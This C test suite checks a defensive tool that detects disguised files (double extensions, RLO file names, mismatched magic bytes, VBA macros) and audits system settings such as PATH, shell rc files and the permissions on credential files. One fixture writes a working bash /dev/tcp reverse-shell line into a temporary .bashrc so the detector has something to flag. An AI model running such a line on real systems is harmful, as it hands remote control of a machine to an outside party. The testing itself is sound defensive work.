/*
 * tests/hlse_file_audit_tests.c — Tests for file masquerade + system audit
 *
 * Build: gcc -O2 -Wall -Wextra -D_POSIX_C_SOURCE=200809L \
 *            -o tests/file_audit_tests \
 *            tests/hlse_file_audit_tests.c hlse_file.c hlse_audit.c -I.
 */

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dirent.h>
#include "../hlse_file.h"
#include "../hlse_audit.h"

static int total = 0, passed = 0, failed = 0;
#define TEST(n) do { total++; printf("  %-55s", n); fflush(stdout); } while(0)
#define PASS()  do { passed++; printf("PASS\n"); } while(0)
#define FAIL(m) do { failed++; printf("FAIL — %s\n", m); } while(0)

static char tmpdir[256];

static void setup(void) {
    snprintf(tmpdir, sizeof(tmpdir), "/tmp/hlse_ftest_%d", getpid());
    mkdir(tmpdir, 0755);
}

static void cleanup(void) {
    DIR *d = opendir(tmpdir);
    if (d) {
        struct dirent *e;
        while ((e = readdir(d)) != NULL) {
            if (e->d_name[0] == '.') continue;
            char p[512];
            snprintf(p, sizeof(p), "%s/%s", tmpdir, e->d_name);
            unlink(p);
        }
        closedir(d);
    }
    rmdir(tmpdir);
}

static void create(const char *name, const void *data, size_t len) {
    char path[512];
    FILE *fp;
    snprintf(path, sizeof(path), "%s/%s", tmpdir, name);
    fp = fopen(path, "wb");
    if (fp) { fwrite(data, 1, len, fp); fclose(fp); }
}

/* ─── File Masquerade (filename-only) ─────────────────────────────────── */

static void test_normal_pdf(void) {
    TEST("File: report.pdf (normal) → low score");
    FileVerdict v = hlse_check_filename("report.pdf");
    if (v.score < 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_double_ext_pdf_exe(void) {
    TEST("File: invoice.pdf.exe → BLOCK (double extension)");
    FileVerdict v = hlse_check_filename("invoice.pdf.exe");
    if (v.score >= 60) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_double_ext_jpg_scr(void) {
    TEST("File: photo.jpg.scr → BLOCK");
    FileVerdict v = hlse_check_filename("photo.jpg.scr");
    if (v.score >= 60) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_rlo_filename(void) {
    TEST("File: RLO character in filename → ISOLATE");
    /* U+202E RLO in UTF-8: E2 80 AE */
    char name[64] = "report\xe2\x80\xae" "exe.pdf";
    FileVerdict v = hlse_check_filename(name);
    if (v.score >= 80) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_lure_exe(void) {
    TEST("File: urgent_invoice_payment.exe → lure+exe");
    FileVerdict v = hlse_check_filename("urgent_invoice_payment.exe");
    if (v.score >= 30) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_normal_txt(void) {
    TEST("File: notes.txt (benign) → score 0");
    FileVerdict v = hlse_check_filename("notes.txt");
    if (v.score == 0) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

/* ─── File Masquerade (with disk access) ──────────────────────────────── */

static void test_pe_in_pdf(void) {
    setup();
    /* Create a file with PDF extension but PE/MZ header */
    unsigned char pe_head[64];
    memset(pe_head, 0, sizeof(pe_head));
    pe_head[0] = 0x4D; pe_head[1] = 0x5A; /* MZ */
    create("report.pdf", pe_head, sizeof(pe_head));

    char path[512];
    snprintf(path, sizeof(path), "%s/report.pdf", tmpdir);

    TEST("File: MZ header in .pdf → MAGIC MISMATCH");
    FileVerdict v = hlse_check_file(path);
    if (v.score >= 60) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_macho_in_docx(void) {
    setup();
    /* Mach-O 64-bit little-endian header (CF FA ED FE) with a .docx name —
     * a macOS executable masquerading as an Office document. */
    unsigned char macho_head[64];
    memset(macho_head, 0, sizeof(macho_head));
    macho_head[0] = 0xCF; macho_head[1] = 0xFA;
    macho_head[2] = 0xED; macho_head[3] = 0xFE;
    create("salary.docx", macho_head, sizeof(macho_head));

    char path[512];
    snprintf(path, sizeof(path), "%s/salary.docx", tmpdir);

    TEST("File: Mach-O header in .docx → MAGIC MISMATCH");
    FileVerdict v = hlse_check_file(path);
    if (v.score >= 60) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_macho_dylib_ok(void) {
    setup();
    /* A legitimate .dylib IS Mach-O — must NOT be flagged as a mismatch. */
    unsigned char macho_head[64];
    memset(macho_head, 0, sizeof(macho_head));
    macho_head[0] = 0xCF; macho_head[1] = 0xFA;
    macho_head[2] = 0xED; macho_head[3] = 0xFE;
    create("libfoo.dylib", macho_head, sizeof(macho_head));

    char path[512];
    snprintf(path, sizeof(path), "%s/libfoo.dylib", tmpdir);

    TEST("File: Mach-O .dylib → not a mismatch (low score)");
    FileVerdict v = hlse_check_file(path);
    if (v.score < 60) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_real_pdf(void) {
    setup();
    unsigned char pdf_head[] = "%PDF-1.4 real pdf content here\n";
    create("real.pdf", pdf_head, sizeof(pdf_head) - 1);

    char path[512];
    snprintf(path, sizeof(path), "%s/real.pdf", tmpdir);

    TEST("File: real PDF → low score");
    FileVerdict v = hlse_check_file(path);
    if (v.score < 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_polyglot_gif_exe(void) {
    setup();
    /* GIF magic header on a .exe — polyglot / payload-hiding technique */
    unsigned char gif[128];
    memset(gif, 0x41, sizeof(gif));
    gif[0]=0x47; gif[1]=0x49; gif[2]=0x46; gif[3]=0x38; /* GIF8 */
    create("payload.exe", gif, sizeof(gif));

    char path[512];
    snprintf(path, sizeof(path), "%s/payload.exe", tmpdir);

    TEST("File: GIF content in .exe → polyglot flagged");
    FileVerdict v = hlse_check_file(path);
    if (v.score >= 50) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_real_gif_ok(void) {
    setup();
    /* Genuine GIF as .gif — must NOT be flagged */
    unsigned char gif[128];
    memset(gif, 0x41, sizeof(gif));
    gif[0]=0x47; gif[1]=0x49; gif[2]=0x46; gif[3]=0x38;
    create("image.gif", gif, sizeof(gif));

    char path[512];
    snprintf(path, sizeof(path), "%s/image.gif", tmpdir);

    TEST("File: genuine GIF as .gif → not flagged");
    FileVerdict v = hlse_check_file(path);
    if (v.score < 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

static void test_ole_with_vba(void) {
    setup();
    /* OLE compound doc header + "VBA" string */
    unsigned char ole[256];
    memset(ole, 0, sizeof(ole));
    ole[0]=0xD0; ole[1]=0xCF; ole[2]=0x11; ole[3]=0xE0; /* OLE sig */
    memcpy(ole + 100, "VBA", 3);
    create("macro.doc", ole, sizeof(ole));

    char path[512];
    snprintf(path, sizeof(path), "%s/macro.doc", tmpdir);

    TEST("File: OLE doc with VBA → macro detected");
    FileVerdict v = hlse_check_file(path);
    if (v.score >= 25) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    cleanup();
}

/* ─── System Audit ────────────────────────────────────────────────────── */

static void test_audit_ssh(void) {
    TEST("Audit: SSH config check completes without crash");
    AuditVerdict v = hlse_audit_ssh();
    if (v.score >= 0 && v.score <= 100) PASS();
    else FAIL("invalid score");
}

static void test_audit_permissions(void) {
    TEST("Audit: permission check completes without crash");
    AuditVerdict v = hlse_audit_permissions();
    if (v.score >= 0 && v.score <= 100) PASS();
    else FAIL("invalid score");
}

static void test_audit_dns(void) {
    TEST("Audit: DNS/hosts check completes without crash");
    AuditVerdict v = hlse_audit_dns();
    if (v.score >= 0 && v.score <= 100) PASS();
    else FAIL("invalid score");
}

static void test_audit_cron(void) {
    TEST("Audit: cron check completes without crash");
    AuditVerdict v = hlse_audit_cron();
    if (v.score >= 0 && v.score <= 100) PASS();
    else FAIL("invalid score");
}

static void test_audit_path_dot(void) {
    char saved[4096];
    const char *orig = getenv("PATH");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("PATH", "/usr/bin:.", 1);
    AuditVerdict v = hlse_audit_path();
    setenv("PATH", saved, 1);
    TEST("Audit A5: '.' in PATH → flagged");
    if (v.score > 0) PASS(); else FAIL("'.' in PATH not flagged");
}

static void test_audit_path_clean(void) {
    char saved[4096];
    const char *orig = getenv("PATH");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("PATH", "/usr/bin:/bin", 1);
    AuditVerdict v = hlse_audit_path();
    setenv("PATH", saved, 1);
    TEST("Audit A5: clean PATH → score 0");
    if (v.score == 0) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_audit_shellrc_backdoor(void) {
    char saved[512], rcpath[512];
    const char *orig;
    const char *rc = "export EDITOR=vim\n"
                     "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1\n";
    setup();
    create(".bashrc", rc, strlen(rc));
    orig = getenv("HOME");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("HOME", tmpdir, 1);
    AuditVerdict v = hlse_audit_shellrc();
    setenv("HOME", saved, 1);
    TEST("Audit A6: /dev/tcp reverse shell in .bashrc → flagged");
    if (v.score >= 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    snprintf(rcpath, sizeof(rcpath), "%s/.bashrc", tmpdir); /* cleanup skips dotfiles */
    unlink(rcpath);
    cleanup();
}

static void test_audit_shellrc_clean(void) {
    char saved[512], rcpath[512];
    const char *orig;
    const char *rc = "export EDITOR=vim\nalias ll='ls -la'\n";
    setup();
    create(".bashrc", rc, strlen(rc));
    orig = getenv("HOME");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("HOME", tmpdir, 1);
    AuditVerdict v = hlse_audit_shellrc();
    setenv("HOME", saved, 1);
    TEST("Audit A6: benign .bashrc → score 0 (no FP)");
    if (v.score == 0) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
    snprintf(rcpath, sizeof(rcpath), "%s/.bashrc", tmpdir);
    unlink(rcpath);
    cleanup();
}

static void test_audit_perm_aws_creds(void) {
    char saved[512], cred_path[512], aws_dir[512];
    const char *orig;

    setup();
    snprintf(aws_dir, sizeof(aws_dir), "%s/.aws", tmpdir);
    mkdir(aws_dir, 0755);
    snprintf(cred_path, sizeof(cred_path), "%s/.aws/credentials", tmpdir);
    {
        FILE *fp = fopen(cred_path, "w");
        if (fp) {
            fputs("[default]\naws_secret_access_key=AAAA\n", fp);
            fclose(fp);
        }
    }
    /* Make world-readable (0644) — should trigger A2 */
    chmod(cred_path, 0644);
    orig = getenv("HOME");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("HOME", tmpdir, 1);
    {
        AuditVerdict v = hlse_audit_permissions();
        setenv("HOME", saved, 1);
        unlink(cred_path); rmdir(aws_dir); cleanup();
        TEST("Audit A2: world-readable .aws/credentials → flagged");
        if (v.score > 0) PASS();
        else FAIL("AWS credentials exposure not detected");
    }
}

static void test_audit_perm_ssh_key(void) {
    char saved[512], key_path[512], ssh_dir[512];
    const char *orig;

    setup();
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", tmpdir);
    mkdir(ssh_dir, 0755);
    snprintf(key_path, sizeof(key_path), "%s/.ssh/id_rsa", tmpdir);
    {
        FILE *fp = fopen(key_path, "w");
        if (fp) {
            fputs("-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n"
                  "-----END OPENSSH PRIVATE KEY-----\n", fp);
            fclose(fp);
        }
    }
    /* Make group-readable (0640) — should trigger A2 */
    chmod(key_path, 0640);
    orig = getenv("HOME");
    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
    setenv("HOME", tmpdir, 1);
    {
        AuditVerdict v = hlse_audit_permissions();
        setenv("HOME", saved, 1);
        unlink(key_path); rmdir(ssh_dir); cleanup();
        TEST("Audit A2: group-readable ~/.ssh/id_rsa → flagged");
        if (v.score > 0) PASS();
        else FAIL("SSH key exposure not detected");
    }
}

static void test_file_php_executable(void) {
    /* Single-extension .php: executable-extension informational (+5).
     * Two lure words needed for the F6 signal; this verifies PHP is
     * at least recognized as an executable extension (score > 0).     */
    TEST("File: invoice_payment.php → F6 lure + PHP executable");
    FileVerdict v = hlse_check_filename("invoice_payment.php");
    if (v.score >= 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_file_kyc_lure(void) {
    /* kyc + document → two lure words → F6 fires when combined with .exe */
    TEST("File: kyc_document.exe → F6 kyc+document lure + executable");
    FileVerdict v = hlse_check_filename("kyc_document.exe");
    if (v.score >= 40) PASS();
    else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
}

static void test_audit_all(void) {
    TEST("Audit: combined audit completes without crash");
    AuditVerdict v = hlse_audit_all();
    if (v.score >= 0 && v.score <= 100 && v.n_findings >= 0) PASS();
    else FAIL("invalid");
}

static void test_audit_hardening_index(void) {
    TEST("Audit: hardening index = 100 - clamped risk");
    AuditVerdict a;
    int ok = 1;
    memset(&a, 0, sizeof(a));
    a.score = 0;   if (hlse_audit_hardening_index(&a) != 100) ok = 0;
    a.score = 30;  if (hlse_audit_hardening_index(&a) != 70)  ok = 0;
    a.score = 100; if (hlse_audit_hardening_index(&a) != 0)   ok = 0;
    a.score = 150; if (hlse_audit_hardening_index(&a) != 0)   ok = 0; /* clamp hi */
    a.score = -5;  if (hlse_audit_hardening_index(&a) != 100) ok = 0; /* clamp lo */
    if (hlse_audit_hardening_index(NULL) != 0) ok = 0;               /* NULL safe */
    if (ok) PASS(); else FAIL("index mismatch");
}

/* ─── Main ────────────────────────────────────────────────────────────── */

int main(void) {
    printf("HLSE File Masquerade + System Audit — Tests\n");
    printf("══════════════════════════════════════════\n\n");

    printf("File masquerade (filename-only):\n");
    test_normal_pdf();
    test_double_ext_pdf_exe();
    test_double_ext_jpg_scr();
    test_rlo_filename();
    test_lure_exe();
    test_normal_txt();
    test_file_php_executable();
    test_file_kyc_lure();

    printf("\nFile masquerade (with disk access):\n");
    test_pe_in_pdf();
    test_macho_in_docx();
    test_macho_dylib_ok();
    test_real_pdf();
    test_polyglot_gif_exe();
    test_real_gif_ok();
    test_ole_with_vba();

    printf("\nSystem audit:\n");
    test_audit_ssh();
    test_audit_permissions();
    test_audit_dns();
    test_audit_cron();
    test_audit_path_dot();
    test_audit_path_clean();
    test_audit_shellrc_backdoor();
    test_audit_shellrc_clean();
    test_audit_perm_aws_creds();
    test_audit_perm_ssh_key();
    test_audit_all();
    test_audit_hardening_index();

    printf("\n══════════════════════════════════════════\n");
    printf("File/Audit tests: %d/%d passed", passed, total);
    if (failed > 0) printf(", %d FAILED", failed);
    printf("\n══════════════════════════════════════════\n");

    return failed > 0 ? 1 : 0;
}
